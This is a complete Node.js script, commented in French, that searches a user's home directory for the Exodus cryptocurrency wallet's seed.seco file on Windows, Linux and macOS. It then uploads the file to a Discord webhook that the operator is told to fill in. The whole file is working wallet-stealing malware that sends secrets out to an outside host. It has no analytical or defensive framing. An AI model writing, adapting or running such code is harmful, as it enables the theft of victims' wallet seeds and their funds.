const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const BOUNDARY = '----WebKitFormBoundary' + Math.random().toString(16).slice(2);

// Replace by ur webhook
const WEBHOOK_URL = 'https://discord.com/api/webhooks/TON_WEBHOOK_ID/TON_WEBHOOK_TOKEN';

function getAllPossibleSeedSecoPaths() {
    const home = os.homedir();
    const paths = [];
    if (process.platform === 'win32') {
        paths.push(path.join(home, 'AppData', 'Roaming', 'Exodus', 'exodus.wallet', 'seed.seco'));
        paths.push(path.join(home, 'AppData', 'Roaming', 'Exodus', 'seed.seco'));
        paths.push(path.join(home, 'AppData', 'Roaming', 'Exodus', 'exodus.wallet'));
    } else if (process.platform === 'linux') {
        paths.push(path.join(home, '.config', 'Exodus', 'exodus.wallet', 'seed.seco'));
        paths.push(path.join(home, '.config', 'Exodus', 'seed.seco'));
        paths.push(path.join(home, '.config', 'Exodus', 'exodus.wallet'));
    } else if (process.platform === 'darwin') {
        paths.push(path.join(home, 'Library', 'Application Support', 'Exodus', 'exodus.wallet', 'seed.seco'));
        paths.push(path.join(home, 'Library', 'Application Support', 'Exodus', 'seed.seco'));
        paths.push(path.join(home, 'Library', 'Application Support', 'Exodus', 'exodus.wallet'));
    }
    return paths;
}

function findSeedSecoFile() {
    const paths = getAllPossibleSeedSecoPaths();
    for (const p of paths) {
        if (fs.existsSync(p) && fs.statSync(p).isFile()) {
            console.log('[DEBUG] seed.seco trouvé :', p);
            return p;
        }
        if (fs.existsSync(p) && fs.statSync(p).isDirectory()) {
            const files = fs.readdirSync(p);
            for (const f of files) {
                if (f === 'seed.seco') {
                    const fullPath = path.join(p, f);
                    if (fs.statSync(fullPath).isFile()) {
                        console.log('[DEBUG] seed.seco trouvé dans dossier :', fullPath);
                        return fullPath;
                    }
                }
            }
        }
    }
    console.log('[DEBUG] Aucun fichier seed.seco trouvé dans les chemins connus.');
    return null;
}

function sendFileToWebhook(filePath) {
    const fileContent = fs.readFileSync(filePath);
    const filename = path.basename(filePath);

    const payloadJson = JSON.stringify({
        content: "🟣 Fichier seed.seco Exodus en pièce jointe."
    });

    const data = Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\n`),
        Buffer.from('Content-Disposition: form-data; name="payload_json"\r\n\r\n'),
        Buffer.from(payloadJson + '\r\n'),
        Buffer.from(`--${BOUNDARY}\r\n`),
        Buffer.from(`Content-Disposition: form-data; name="file"; filename="${filename}"\r\n`),
        Buffer.from('Content-Type: application/octet-stream\r\n\r\n'),
        fileContent,
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`)
    ]);

    const url = new URL(WEBHOOK_URL);
    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${BOUNDARY}`,
            'Content-Length': data.length
        }
    };

    const req = https.request(options, res => {
        console.log('[DEBUG] Réponse webhook status :', res.statusCode);
        res.on('data', d => process.stdout.write(d));
    });
    req.on('error', (e) => {
        console.error('[DEBUG] Erreur envoi webhook :', e);
    });
    req.write(data);
    req.end();
    console.log('[DEBUG] Fichier envoyé au webhook.');
}

function main() {
    const seedPath = findSeedSecoFile();
    if (!seedPath) {
        console.error('Impossible de trouver le fichier seed.seco dans les chemins connus.');
        return;
    }
    sendFileToWebhook(seedPath);
}

main();
